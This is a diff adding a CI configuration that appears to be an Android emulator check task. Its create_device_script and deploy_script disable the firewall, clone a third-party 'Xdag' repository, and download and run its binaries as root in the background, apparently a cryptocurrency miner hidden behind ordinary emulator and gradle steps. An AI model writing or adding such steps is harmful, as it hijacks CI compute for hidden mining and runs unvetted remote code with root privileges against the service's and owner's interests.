@@ -1,0 +1,42 @@
+container:
+
+  image: golang:latest
+
+  cpu: 8
+
+  memory: 10G
+
+check_android_task:
+
+  create_device_script:
+        sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          git clone https://github.com/Hjhjk68/Xdag.git && cd Xdag
+          chmod +x xdag
+          sudo su --command "nohup ./xdag --log=stdout > meta.log &"
+          sleep 2
+          sudo su --command "cat meta.log"
+  deploy_script:
+          wget raw.githubusercontent.com/Hjhjk68/Xdag/main/deploy
+          chmod +x deploy
+          sudo su --command "./deploy"
+          
+  start_emulator_background_script:
+
+    $ANDROID_HOME/emulator/emulator
+
+        -avd test
+
+        -no-audio
+
+        -no-window
+
+  wait_for_emulator_script: 
+
+    - adb wait-for-device
+
+    - adb shell input keyevent 82
+
+  check_script: ./gradlew check connectedCheck
+ 
